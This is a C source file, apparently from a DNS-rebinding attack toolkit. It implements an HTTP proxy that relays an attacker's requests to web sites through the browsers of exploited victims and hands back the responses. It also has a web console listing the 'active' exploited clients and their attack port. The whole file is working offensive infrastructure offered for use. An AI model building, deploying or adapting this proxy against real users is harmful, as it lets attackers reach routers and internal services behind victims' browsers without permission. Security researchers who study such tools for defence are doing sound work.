/* Proxy server used to interact with Web sites via exploited client's Web browsers. Accepts HTTP requests and
 * queues them in the database. Then waits for a response from the callback server via a FIFO to indicate that the
 * response has been received and is waiting in the database. Response is then returned to the requestor's socket.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include "common.h"
#include "config.h"
#include "sql.h"
#include "socklib.h"
#include "fifo.h"
#include "filter.h"
#include "proxy.h"
#include "html.h"
#include "png.h"

int proxy_server()
{
	int rx_bytes = 0, post_data_size = 0;
	int lsock = 0, csock = 0, client_data_size = 0;
	int result_size = 0, err_code = 0, id = 0;
	int addrlen = sizeof(struct sockaddr_in);
	struct sockaddr_in clientaddr;
	char *buffer = NULL, *post_data = NULL;
	char *host = NULL, *url = NULL;
	char *query = NULL, *fifo_file = NULL;
	char *get_data = NULL;
	char *client_data = NULL, *headers = NULL;
	char *server_ip = NULL;

	memset((void *) &clientaddr,0,addrlen);

	server_ip = config_get_server_ip();

	/* Create TCP socket */
	if((lsock = create_socket(server_ip,PROXY_PORT,SOCK_STREAM)) == SOCK_FAIL){
                glog("Failed to create TCP socket for proxy server",LOG_ERROR_TYPE);
		if(server_ip) free(server_ip);
                return EXIT_FAILURE;
	}
	if(server_ip) free(server_ip);

	/* Infinite receive loop */
	while(1){

		/* Accept incoming connection */
                if((csock = accept(lsock,(struct sockaddr *) &clientaddr,(socklen_t *) &addrlen)) < 0){
                        glog("Failed to accept TCP connection to proxy server",LOG_ERROR_TYPE);
                        if(buffer) free(buffer);
                        return EXIT_FAILURE;
                }

		if(!fork()){
			/* Receive client request */
			if((buffer = receive(lsock,SOCK_STREAM,&rx_bytes,csock,&clientaddr)) == NULL){
				glog("Failed to read data from client request sent to proxy server",LOG_ERROR_TYPE);
				exit(EXIT_FAILURE);
			}

			if(is_using_proxy(buffer)){

				/* Get the target's IP address */
				host = get_host_name(buffer);
	
				/* Get the target URL path */
				url = get_url(buffer);

				/* Get POST data, if any */
				post_data = get_post_data(buffer,rx_bytes,&post_data_size);

				/* Get HTTP headers from request */
				headers = get_headers(buffer);

				/* If the CONSOLE_HOST is requested, then display the Web console interface */
				if(memcmp(host,CONSOLE_HOST,CONSOLE_HOST_SIZE) == 0){
					show_web_ui(csock,url);
					close_socket(csock);
				} else {

					/* Make sure the requested host is in our clients list */
					query = sqlite3_mprintf("SELECT id FROM %s WHERE strftime('%%s',callback_time) >= strftime('%%s','now') AND ip = %Q LIMIT 1",CLIENTS_TABLE,host);
					sql_exec(query,&result_size,&err_code);
					sqlite3_free(query);
	
					if(result_size > 0){
						/* Don't allow requests for filtered file extensions */
						if(!is_url_filtered(url)){

							fifo_file = create_fifo(host);
							if(!fifo_file){
								glog("Failed to create fifo file",LOG_ERROR_TYPE);
							} else {
								/* Insert query into queue table */
								query = sqlite3_mprintf("INSERT INTO %s (fifo,host,url,headers,pdata,sent) VALUES (%Q,%Q,%Q,%Q,%Q,0)",QUEUE_TABLE,fifo_file,host,url,headers,post_data);
								sql_exec(query,&result_size,&err_code);
								sqlite3_free(query);
								if(err_code != SQLITE_OK){
									sql_log_error();
								} else {

									/* When the client data has returned, the callback server will write the ID of the callback to the FIFO */
									id = read_from_fifo(fifo_file);
									
									/* Extract the data from the DB */
									get_data = sqlite3_mprintf("SELECT rdata FROM %s WHERE id = '%d'",QUEUE_TABLE,id);
									client_data = sql_exec(get_data,&client_data_size,&err_code);
									sqlite3_free(get_data);

									if(err_code != SQLITE_OK){
										sql_log_error();
									} else {

										/* Write data to socket */
										if(write(csock,client_data,client_data_size) != client_data_size){
											glog("Proxy socket write failed",LOG_ERROR_TYPE);
										}
									}
									if(client_data) free(client_data);

									/* Make sure the fifo gets deleted */
									destroy_fifo(fifo_file);
								}
							}
						}
					}
				}
			}

			/* Exit the child process */
			close_socket(csock);
			if(fifo_file) free(fifo_file);
			if(buffer) free(buffer);
			if(host) free(host);
			if(url) free(url);
			if(post_data) free(post_data);
			if(headers) free(headers);
			exit(EXIT_SUCCESS);
		}
	}

	/* Close up shop */
	close_socket(csock);
	close_socket(lsock);

	return EXIT_FAILURE;
}

/* Simple check to see if the client is using us as his proxy */
int is_using_proxy(char *buffer)
{
	char *url_ptr = NULL;

	/* If using us as a proxy, the request will be for the full URL.
	 * If not using us as a proxy, the request will be only for the relative path.
	 */
	if((url_ptr = strstr(buffer,SPACE_STR)) != NULL){
		url_ptr++;
		if(memcmp(url_ptr,PROTOCOL_DELIMITER,PROTOCOL_DELIMITER_SIZE) == 0){
			return 1;
		}
	}

	return 0;
}

/* Return a pointer to the server host name */
char *get_host_name(char *buffer)
{
	char *host = NULL;
	char *start_ptr = NULL, *end_ptr = NULL, *col_ptr = NULL;

	if(buffer == NULL){
		return NULL;
	}

	if((start_ptr = strstr(buffer,PROTOCOL_DELIMITER)) == NULL){
		return NULL;
	}
	start_ptr += PROTOCOL_DELIMITER_SIZE;

	if((end_ptr = strstr(start_ptr,SLASH)) == NULL){
		return NULL;
	}
	memset(end_ptr,0,SLASH_SIZE);

	host = strdup(start_ptr);
	memset(end_ptr,SLASH_CHAR,SLASH_SIZE);

	/* Just want the host name, not the port number */
	if((col_ptr = strchr(host,COLON))){
		memset(col_ptr,0,1);
	}

	return host;
}

/* Extract the destination URL from the client request */
char *get_url(char *buffer)
{
	char *url = NULL;
	char *start_ptr = NULL, *end_ptr = NULL;

	if(buffer == NULL){
		return NULL;
	}

	if((start_ptr = strstr(buffer,PROTOCOL_DELIMITER)) == NULL){
		return NULL;
	}
	start_ptr += PROTOCOL_DELIMITER_SIZE;
	if((start_ptr = strstr(start_ptr,SLASH)) == NULL){
		return NULL;
	}
	
	if((end_ptr = strstr(start_ptr,SPACE_STR)) == NULL){
		return NULL;
	}
	memset(end_ptr,0,SPACE_SIZE);

	url = strdup(start_ptr);
	memset(end_ptr,SPACE_CHAR,SPACE_SIZE);

	return url;
}

/* Return a copy of all HTTP headers in the request */
char *get_headers(char *buffer)
{
	char *headers_ptr = NULL, *end_headers_ptr = NULL;
	char *headers = NULL;
	int headers_size = 0;

	/* Find the start of the HTTP headers */
	if((headers_ptr = strstr(buffer,CRLF)) == NULL){
		return NULL;
	}
	headers_ptr += CRLF_SIZE;

	/* Find the end of the HTTP headers */
	if((end_headers_ptr = strstr(headers_ptr,HTTP_END_HEADERS)) == NULL){
		return NULL;
	}

	/* Make a copy of the raw HTTP headers */
	headers_size = (int) (end_headers_ptr - headers_ptr);
	if((headers = malloc(headers_size+1)) == NULL){
		perror("Malloc failure");
		return NULL;
	}
	memset(headers,0,headers_size+1);
	memcpy(headers,headers_ptr,headers_size);

	/* JavaScript doesn't like newlines, so replace CRLF delimiters with '%%'.
	 * Double-percent signs will be converted back into CRLF characters by the
	 * client-side JavaScript.
	 */
	js_format_headers(headers);

	return headers;
}


/* Return the post data, if any */
char *get_post_data(char *buffer, int buffer_size, int *data_size)
{
	char *data_ptr = NULL, *pdata = NULL;

	*data_size = 0;

	/* Is this a POST request? */
	if(memcmp(buffer,HTTP_POST,HTTP_POST_SIZE) != 0){
		return NULL;
	}

	/* Locate the end of the HTTP headers */
	if((data_ptr = strstr(buffer,HTTP_END_HEADERS)) == NULL){
		return NULL;
	}
	data_ptr += HTTP_END_HEADERS_SIZE;

	/* Post data size is the difference between the buffer size and the end of the HTTP headers */
	*data_size = buffer_size - ((int) (data_ptr - buffer));
	
	/* Allocate memory for POST data and copy */
	if((pdata = malloc(*data_size+1)) == NULL){
		perror("Malloc failure");
		return NULL;
	}
	memset(pdata,0,*data_size+1);
	memcpy(pdata,data_ptr,*data_size);

	return pdata;
}

/* Display the console Web page */
void show_web_ui(int csock, char *request)
{	
	char *data = NULL;
	int data_size = 0;

	/* Point data at the data blob associated with the requested URL */
	if(strstr(request,BODY_BG_PNG_PATH)){
		data = BODY_BG_PNG;
		data_size = BODY_BG_PNG_SIZE;
	} else if(strstr(request,HEADER_PNG_PATH)){
		data = HEADER_PNG;
		data_size = HEADER_PNG_SIZE;
	} else if(strstr(request,HEADER_BG_PNG_PATH)){
		data = HEADER_BG_PNG;
		data_size = HEADER_PNG_SIZE;
	} else if(strstr(request,FOOTER_BG_PNG_PATH)){
		data = FOOTER_BG_PNG;
		data_size = FOOTER_BG_PNG_SIZE;
	} else if((strlen(request) == INDEX_PATH_SIZE) && (memcmp(request,INDEX_PATH,INDEX_PATH_SIZE) == 0)){
		data = PROXY_HTML;
		data_size = PROXY_HTML_SIZE;
	}

	if(data){
		/* Write data to browser */
		if(send_http_response(csock,data,data_size) == SOCK_FAIL){
			glog("Proxy server failed to write image data to client browser",LOG_ERROR_TYPE);
			return;
		}
	} else {
		/* Write client list to browser */
		print_client_list(csock);
	}

	return;
}

/* Used by the proxy server to display active IPs. Prints results to csock. */
void print_client_list(int csock)
{
        int rc = 0, col_type = 0, line_size = 0, class_toggle = TD_GREY;
        sqlite3_stmt *stmt = NULL;
        char *ip = NULL, *timestamp = NULL, *line = NULL;
        char *query = NULL, *path = NULL, *attack_port = NULL;

	/* Write out the HTML table headers */
	if(write(csock,CLIENT_TABLE_HEADERS,CLIENT_TABLE_HEADERS_SIZE) != CLIENT_TABLE_HEADERS_SIZE){
		glog("Proxy server failed to write out the client table headers",LOG_ERROR_TYPE);
		return;
	}

        /* Prepare the SQL query */
	query = sqlite3_mprintf("SELECT ip,callback_time FROM %s WHERE strftime('%%s',callback_time) > strftime('%%s','now') ORDER BY id",CLIENTS_TABLE);
        rc = sqlite3_prepare_v2(globals.db,query,strlen(query),&stmt,NULL);
        if(rc != SQLITE_OK){
		sql_log_error();
		sqlite3_free(query);
                return;
        }

	path = config_get_path();
	attack_port = config_get_attack_port();

        /* Loop until the query has finished */
        while((rc = sqlite3_step(stmt)) != SQLITE_DONE){
                switch(rc){

                        case SQLITE_ERROR:
				sql_log_error();
                                sqlite3_finalize(stmt);
				sqlite3_free(query);
				if(path) free(path);
				if(attack_port) free(attack_port);
                                return;

                        case SQLITE_BUSY:
                                /* If the table is locked, wait then try again */
                                usleep(BUSY_WAIT_PERIOD);
                                break;

                        case SQLITE_ROW:
                        {
                                col_type = sqlite3_column_type(stmt,0);
                                switch(col_type)
                                {
                                        case SQLITE_TEXT:
                                                ip = (void *) sqlite3_column_text(stmt,0);
                                                timestamp = (void *) sqlite3_column_text(stmt,1);

                                                line = sqlite3_mprintf("<tr class=\"tr%d\" onmouseover=\"lock_updates()\" onmouseout=\"unlock_updates()\" onclick=\"go('%s:%s%s')\"><td>%s</td><td>%s</td></tr>",class_toggle,ip,attack_port,path,ip,timestamp);
                                                line_size = strlen(line);
                                                if(write(csock,line,line_size) != line_size){
                                                        glog("Proxy server failed to write out active client list to Web UI",LOG_ERROR_TYPE);
                                                }

                                                /* Toggle the class (and thus, the color) of the next table row */
                                                if(class_toggle){
                                                        class_toggle = TD_GREY;
                                                } else {
                                                        class_toggle = TD_WHITE;
                                                }

                                                sqlite3_free(line);
                                                line_size = 0;
						break;
                                }
                        }
                }
        }

        sqlite3_finalize(stmt);
        sqlite3_free(query);
	if(path) free(path);
	if(attack_port) free(attack_port);
        return;
}

